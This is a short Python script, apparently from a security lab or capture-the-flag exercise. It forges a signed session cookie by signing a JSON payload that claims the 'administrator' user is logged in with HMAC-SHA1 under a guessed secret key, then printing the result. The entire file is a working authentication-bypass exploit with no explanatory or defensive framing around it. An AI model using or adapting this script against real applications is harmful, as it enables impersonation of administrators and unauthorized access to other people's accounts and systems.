import hmac
import hashlib
import base64
# spring security tokens
# Guessed key (change this!)
key = b'secret'

# Payload (must be exact string before the --)
data = '{"username":"administrator","isloggedin":true}'

# Create HMAC-SHA1 signature
sig = hmac.new(key, data.encode(), hashlib.sha1).digest()
sig_b64 = base64.b64encode(sig).decode()

# Final cookie
cookie = f"{data}--{sig_b64}"
print(cookie)
